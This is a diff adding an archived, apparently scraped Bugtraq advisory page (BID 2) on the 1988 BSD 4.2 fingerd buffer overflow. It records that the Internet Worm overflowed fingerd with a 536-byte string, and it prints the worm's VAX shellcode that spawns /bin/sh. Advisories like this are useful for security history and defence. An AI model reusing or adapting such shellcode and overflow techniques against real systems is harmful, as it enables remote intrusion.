@@ -1,0 +1,94 @@
+#SpeeDr00t@Black Falcon<br>#bid2<p><b><span style="font-size: 18pt;">BSD fingerd buffer overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/2/info">info</a><br><a href="http://www.securityfocus.com/bid/2/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/2/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/2/solution">solution</a><br><a href="http://www.securityfocus.com/bid/2/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				2
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 01 1988 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Oct 01 1988 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					BSD BSD 4.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The Internet Worm used a string of 536 bytes to<br/>overflow the input buffer of fingerd on the VAX. The<br/>VAX machine code it used was:<br/><br/>pushl	$68732f		'sh\0'<br/>pushl	$6e69622f	'/bin'<br/>movl	sp, r10<br/>pushl	$0<br/>pushl	$0<br/>pushl	r10<br/>pushl	$3<br/>movl	sp, ap<br/>chmk	$3b<br/><br/>This code executed execve("/bin/sh", 0, 0). 
+	
+		<ul>
+</ul>
+</div>
